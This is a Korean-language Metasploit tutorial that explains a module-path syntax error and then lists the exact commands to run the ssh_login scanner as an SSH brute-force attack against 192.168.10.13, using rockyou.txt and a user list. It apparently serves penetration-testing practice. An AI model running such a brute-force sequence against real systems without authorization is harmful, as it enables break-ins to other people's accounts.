01. 모듈 로딩 실패(Failed to load module) 해결

메타스플로잇에서 모듈을 불러올 때 가장 자주 발생하는 실수는 Path Syntax (경로 구문)의 오류입니다. 메타스플로잇의 모든 모듈 경로는 슬래시(/)로 구분하며, 괄호(())는 프롬프트의 상태 정보를 나타낼 뿐 경로의 일부가 아닙니다.

Incorrect Syntax
msf6 > use auxiliary(scanner/ssh/ssh_login)

결과: [-] No results from search. 메타스플로잇은 괄호가 포함된 경로를 인식하지 못합니다.

Correct Syntax
msf6 > use auxiliary/scanner/ssh/ssh_login

결과: 모듈이 정상적으로 로드되며 프롬프트가 변경됩니다.

MSF Module Structure
auxiliary
scanner
ssh
ssh_login

모든 경로는 '슬래시(/)'로 연결되어야 합니다.

02. 정밀 공격 시퀀스 (Full Command Sequence)

침투 테스트를 성공시키기 위해 필요한 Step-by-Step 명령어 리스트입니다. 복사하여 사용할 때 프롬프트 기호(`>`) 앞부분이 포함되지 않도록 주의하십시오.

Step Command (입력할 명령어) Description (설명)
01 use auxiliary/scanner/ssh/ssh_login 로그인 스캔 모듈 선택
02 set RHOSTS 192.168.10.13 공격 대상 서버 IP 주소 설정
03 set PASS_FILE /root/rockyou.txt 패스워드 사전 파일 경로 지정
04 set USER_FILE /root/users.txt 사용자 아이디 리스트 경로 지정
05 set VERBOSE true 실시간 대입 시도 과정 출력 활성화
06 set THREADS 5 공격 속도 향상을 위한 스레드 설정
07 run 무차별 대입 공격 엔진 가동
Pre-Execution Checklist (실행 전 점검 사항)
타겟 서버(192.168.10.13)와 네트워크 통신이 가능한가?
rockyou.txt 파일이 해당 경로에 실제로 존재하는가?
msfconsole 프롬프트가 'auxiliary(scanner/ssh/ssh_login)'인가?
PostgreSQL DB가 연결되어 있는가? (db_status 확인)
